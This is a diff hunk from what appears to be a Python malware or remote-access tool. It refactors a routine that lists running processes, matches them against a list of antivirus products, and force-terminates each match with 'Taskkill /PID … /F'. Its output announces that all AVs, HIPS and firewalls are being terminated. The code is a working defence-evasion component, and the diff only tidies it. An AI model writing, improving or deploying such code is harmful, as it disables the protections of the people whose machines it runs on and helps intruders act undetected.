@@ -250,21 +250,20 @@ for proc in process:
     if len(p) > 1:
         name = p[0]
         procid = p[1]
-        if 'exe' in name:
-            if name in avs:
-                process_list.append(proc)
-                pid.append(p[1])
+        if 'exe' in name and name in avs:
+            process_list.append(proc)
+            pid.append(procid)
+if process_list and len(process_list) == len(pid):
+    av_summary = (
+        'Terminating all Possible AVs, HIPS and/or Third Party firewalls:\n'
+        + 'Image Name:\t\t    PID:'
+    )
 
-if len(process_list) > 0 and len(process_list) == len(pid):
-    av_summary = 'Terminating all Possible AVs, HIPS and/or Third Party firewalls:\n'
-    av_summary += 'Image Name:\t\t    PID:'
     av_summary += '===========\t\t    ===='
     for n in process_list:
         av_summary += n
-    i = 0
-    while i < len(pid):
-        run_command('Taskkill /PID %s /F' % pid[i])
-        i += 1
+    for item in pid:
+        run_command(f'Taskkill /PID {item} /F')
     av_summary += '\n\nTerminations are complete.'
 else:
     av_summary = "No AVs, HIPS and/or Third Party firewalls detected.\n"
